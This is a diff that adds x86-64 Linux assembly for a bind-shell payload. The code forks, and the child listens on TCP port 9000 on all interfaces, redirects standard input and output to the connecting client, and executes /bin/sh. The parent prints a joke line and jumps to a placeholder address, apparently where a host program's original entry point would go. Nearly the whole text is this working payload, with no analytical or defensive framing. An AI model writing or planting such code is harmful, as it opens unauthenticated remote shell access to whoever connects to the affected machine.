@@ -1,6 +1,75 @@
-; open socket
-; bind socket to listen to any ip
-; listen to socket
-; client = accept connection at socket
-; dup2 client to all io
-; execve bash
+[bits 64]
+
+global _start
+
+_start:
+    mov rax, 57 ; sys_fork
+    syscall
+
+    test rax, rax
+    jnz original
+
+    mov rax, 41 ; sys_socket 
+    mov rdi, 2 ; family = AF_INET
+    mov rsi, 1 ; type = SOCK_STREAM
+    xor rdx, rdx ; protocol = 0
+    syscall ; rax = socketfd
+
+    mov rdi, rax ; fd = socketfd
+    sub rsp, 16 ; allocate 16 bytes for sockaddr_in
+    mov word [rsp], 2 ; sin_family = AF_INET
+    mov word [rsp+2], 0x2823 ; sin_port = 9000 
+    mov dword [rsp+4], 0 ; sin_addr = 0 (all)
+    mov rsi, rsp
+    mov rdx, 16 ; addr_len = 16
+    mov rax, 49 ; sys_bind
+    syscall
+
+    mov rax, 50 ; sys_listen
+    mov rsi, 1 ; backlog = 1
+    syscall
+
+    mov rax, 43 ; sys_accept 
+    xor rsi, rsi ; sock_addr = null
+    xor rdx, rdx ; addr_len = null
+    syscall ; rax = clientfd
+
+    mov rdi, rax ; oldfd = clientfd
+    xor rsi, rsi ; newfd = stdin
+    mov rax, 33 ; sys_dup2 
+    syscall
+
+    inc rsi ; newfd = stdout
+    mov rax, 33
+    syscall
+
+    inc rsi ; newfd = stderror
+    mov rax, 33
+    syscall
+    
+    xor rax, rax
+    push rax ; argv[1] = null
+    lea rdi, [rel path] 
+    push rdi ; argv[0] = "/bin/sh"
+    mov rsi, rsp
+    xor rdx, rdx ; envp = null
+    mov rax, 59 ; sys_execve
+    syscall
+
+original:
+    ; sys_write
+    mov rax, 1
+    mov rdi, 1
+    lea rsi, [rel text]
+    mov rdx, 39
+    syscall
+
+    mov rax, 0xDEADBEEFDEADBEEF
+    jmp rax
+
+text:
+    db "dead beef can be binded with meat glue", 0x0A
+
+path:
+    db "/bin/sh", 0
+
